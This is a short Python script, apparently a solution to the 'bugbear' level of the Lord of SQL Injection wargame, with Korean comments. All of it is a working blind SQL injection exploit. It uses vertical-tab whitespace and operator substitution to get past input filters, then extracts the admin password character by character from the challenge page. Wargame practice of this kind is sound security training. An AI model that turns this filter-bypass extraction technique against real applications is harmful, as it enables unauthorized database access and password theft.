#!/usr/bin/py
#-*-coding:utf-8 -*-

import requests

pw=""

for i in range(1,9):
  for j in range(48,128): # ascii code로 변환할 chr() 함수로 전달할 파라미터 값
    try:
      url="https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?pw=1&no=2%0b%7C%7C%0bleft(id,5)%0bin%0b(\"admin\")%0b%26%26%0bright(left(pw," + str(i) + "),1)%0bin%0b(\"" + chr(j) + "\")"
      result = requests.post(url, cookies=(dict(PHPSESSID="세션값")))
    except:
      print("Error...")
      continue
    if 'Hello admin' in result.text:
      pw = pw + chr(j)
      print("pw : " + pw)
      break